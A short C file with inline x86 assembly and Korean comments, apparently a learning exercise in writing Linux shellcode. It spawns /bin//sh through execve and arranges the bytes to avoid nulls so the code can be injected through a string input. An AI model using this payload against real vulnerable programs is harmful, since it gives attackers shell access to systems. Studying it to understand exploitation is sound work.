

int main()
{
	__asm__ __volatile__(

	"push %ebp \n\t"
	"mov %esp, %ebp \n\t"

	// /bin//sh문자열을 스택에 저장
	// push를 편하게 하기 위해 /를 하나 더 썼음(이래도 됨)
	"xor %eax, %eax \n\t"
	"push %eax \n\t"
	"push $0x68732F2F \n\t"
	"push $0x6E69622F \n\t"

	//문자열 주소 백업
	"mov %esp, %ebx \n\t"

	//sh의 메인함수 인자 배열 
	"push %eax \n\t" //eax는 위에서 이미 0으로 초기화
	"push %ebx \n\t"

	//sh의 메인함수 인자 배열 주소 백업
	"mov %esp, %ecx \n\t"

	//execve 함수 인자 NULL설정
	"xor %edx, %edx \n\t"

	//시스템 콜 번호 설정
	//0xb로 하면 문자열 입력이 끝까지 안 됨
	"movb $0xb0, %al \n\t" 
	"shr $0x4, %eax \n\t"

	//시스템 콜
	"int $0x80 \n\t"	

	);
}






